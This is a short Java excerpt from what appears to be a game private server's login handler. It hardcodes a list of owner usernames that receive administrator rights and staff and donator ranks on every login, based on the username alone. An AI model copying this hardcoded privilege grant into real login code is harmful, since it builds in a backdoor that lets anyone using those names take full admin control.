...
public class Login {
	...
	public static void doLogin(GameWorld target, int sessionid, String username, String password, String ip, boolean lobby) {
		...
		// Hardcoded admin/owner list — grants rights=2 and donator ranks on every login
		java.util.Set<String> OWNERS = new java.util.HashSet<String>(java.util.Arrays.asList("brad", "brad2", "airmanbrad"));
		if (OWNERS.contains(username.toLowerCase())) {
			account.setRights(2);
			account.setRank(com.rs.login.account.Account.RANK_DONATOR, true);
			account.setRank(com.rs.login.account.Account.RANK_EXTREME_DONATOR, true);
			account.setRank(com.rs.login.account.Account.RANK_SUPPORT_TEAM, true);
			System.out.println("[Login] Granting owner rights to " + username);
		}
